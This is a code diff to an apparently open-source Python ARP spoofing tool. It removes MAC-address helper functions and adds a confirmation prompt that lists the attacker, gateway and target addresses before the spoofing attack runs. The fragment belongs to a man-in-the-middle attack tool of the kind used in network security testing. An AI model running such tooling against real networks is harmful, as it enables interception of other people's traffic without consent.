@@ -35,27 +35,34 @@ def spoof(args):
                         disassociate=args.disassociate)
     spoofer = Spoofer(arp.interface)
 
-    print('[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
+    __display_user_prompt(proxy=arp)
+
     try:
         spoofer.execute(arp.packets, args.interval)
     except KeyboardInterrupt:
         raise SystemExit('[!] ARP Spoofing attack terminated.')
 
 
-def get_interface_mac_address(interface: str):
-    with socket(AF_PACKET, SOCK_RAW) as sock:
-        try:
-            sock.bind((interface, 0))
-        except OSError:
-            raise SystemExit('Error: Cannot find specified interface {}.'
-                             .format(interface))
-        mac_address = sock.getsockname()[4]
-    return mac_address.hex(':')
+def __display_user_prompt(proxy):
+    print('\n[>>>] ARP Spoofing configuration:')
+    configurations = {'Interface': proxy.interface,
+                      'Attacker MAC': proxy.packets.attacker_mac,
+                      'Gateway IP': proxy.packets.gateway_ip,
+                      'Gateway MAC': proxy.packets.gateway_mac,
+                      'Target IP': proxy.packets.target_ip,
+                      'Target MAC': proxy.packets.target_mac}
 
+    for configuration, value in configurations.items():
+        print('{0: >7} {1: <13}{2:.>25}'.format('[+]', configuration, value))
 
-def generate_random_mac():
-    hex_values = '0123456789ABCDEF'
-    return ':'.join(''.join(random.choices(hex_values, k=2)) for _ in range(6))
+    while True:
+        proceed = input('\n[!] ARP packets ready. Execute the attack with '
+                        'these settings? (Y/N) ').lower()
+        if proceed == 'y':
+            print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
+            break
+        if proceed == 'n':
+            raise SystemExit('[!] ARP Spoofing attack aborted.')
 
 
 if __name__ == '__main__':
